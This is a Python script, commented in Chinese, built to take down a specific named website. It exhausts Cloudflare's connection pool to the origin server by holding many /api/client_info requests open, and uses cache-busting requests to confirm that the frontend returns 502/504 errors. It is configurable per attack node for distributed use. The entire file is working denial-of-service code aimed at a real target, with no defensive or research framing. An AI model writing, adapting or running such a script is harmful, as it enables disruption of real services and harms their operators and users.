#!/usr/bin/env python3
"""
终极前端瘫痪: 耗尽 Cloudflare → 源站连接池
原理: GET /api/client_info 让每个连接挂起 30s
     维持 N 个挂起连接 > Cloudflare 源站连接池上限
     → 新请求无可用连接 → 502/504 → 前端瘫痪
"""
import urllib.request, urllib.error
import time, threading, random, os, ssl, uuid

TARGET = "https://www.xnmoe.com"
DURATION = int(os.environ.get("DURATION", "600"))
HANG_WORKERS = int(os.environ.get("HANG_WORKERS", "15"))
BUST_WORKERS = int(os.environ.get("BUST_WORKERS", "5"))
NODE_ID = os.environ.get("NODE_ID", "0")

ssl_ctx = ssl.create_default_context()
ssl_ctx.check_hostname = False
ssl_ctx.verify_mode = ssl.CERT_NONE

PAGES = ["/", "/guestbook.html", "/post.html", "/about.html", "/friends.html", "/project.html"]

stats = {"hangs": 0, "bust_ok": 0, "bust_err": 0, "bust_502": 0, "bust_timeout": 0}
lock = threading.Lock()
running = True
all_down = False


def api_hang_worker(wid):
    """GET /api/client_info?rand=XXX 挂起源站连接"""
    global all_down
    while running:
        try:
            url = f"{TARGET}/api/client_info?_={uuid.uuid4().hex}"
            req = urllib.request.Request(url, headers={
                "User-Agent": f"Mozilla/5.0 Hang-{NODE_ID}-{wid}",
                "Accept": "*/*",
            })
            urllib.request.urlopen(req, timeout=30, context=ssl_ctx)
            with lock:
                stats["hangs"] += 1
        except:
            with lock:
                stats["hangs"] += 1


def static_bust_worker(wid):
    """缓存穿透 - 检测前端是否瘫痪"""
    global all_down
    while running:
        page = random.choice(PAGES)
        url = f"{TARGET}{page}?_b={uuid.uuid4().hex[:8]}"
        try:
            req = urllib.request.Request(url, headers={
                "User-Agent": f"Mozilla/5.0 Bust-{NODE_ID}-{wid}",
                "Cache-Control": "no-cache, no-store",
                "Pragma": "no-cache",
            })
            resp = urllib.request.urlopen(req, timeout=10, context=ssl_ctx)
            code = resp.status
            resp.read()
            with lock:
                stats["bust_ok"] += 1
            if code in (502, 503, 504):
                with lock:
                    stats["bust_502"] += 1
                    all_down = True
                print(f"\n  *** FRONTEND DOWN! HTTP {code} on {page} ***\n", flush=True)
        except urllib.error.HTTPError as e:
            code = e.code
            with lock:
                stats["bust_502"] += 1
                stats["bust_err"] += 1
            if code in (502, 503, 504):
                all_down = True
                print(f"\n  *** FRONTEND DOWN! HTTP {code} ***\n", flush=True)
        except Exception:
            with lock:
                stats["bust_timeout"] += 1
                stats["bust_err"] += 1
        time.sleep(1)


def monitor():
    t0 = time.time()
    while running:
        time.sleep(15)
        with lock:
            h = stats["hangs"]
            ok = stats["bust_ok"]
            e502 = stats["bust_502"]
            to = stats["bust_timeout"]
        elapsed = time.time() - t0
        remaining = max(0, DURATION - elapsed)
        status = "DOWN" if all_down else "UP"
        print(f"  [{time.strftime('%H:%M:%S')}] {elapsed:.0f}s | "
              f"Frontend: {status} | "
              f"Hangs:{h}({h/elapsed*60 if elapsed>0 else 0:.0f}/min) | "
              f"502:{e502} Timeout:{to} OK:{ok} | "
              f"{remaining:.0f}s left", flush=True)


def main():
    global running
    print(f"\n{'='*62}")
    print(f" FINAL: Cloudflare Connection Pool Exhaustion")
    print(f" Node: {NODE_ID} | {HANG_WORKERS} hang + {BUST_WORKERS} bust workers")
    print(f" Duration: {DURATION}s")
    print(f"{'='*62}\n")

    threading.Thread(target=monitor, daemon=True).start()

    for i in range(HANG_WORKERS):
        threading.Thread(target=api_hang_worker, args=(i,), daemon=True).start()
    for i in range(BUST_WORKERS):
        threading.Thread(target=static_bust_worker, args=(i,), daemon=True).start()

    time.sleep(DURATION)
    running = False
    time.sleep(3)

    with lock:
        h, ok, e502, to = stats["hangs"], stats["bust_ok"], stats["bust_502"], stats["bust_timeout"]
    print(f"\n{'='*62}")
    print(f" FINAL: Hangs {h} | 502: {e502} | Timeout: {to} | OK: {ok}")
    print(f" Frontend DOWN: {all_down}")
    print(f"{'='*62}\n")


if __name__ == "__main__":
    main()
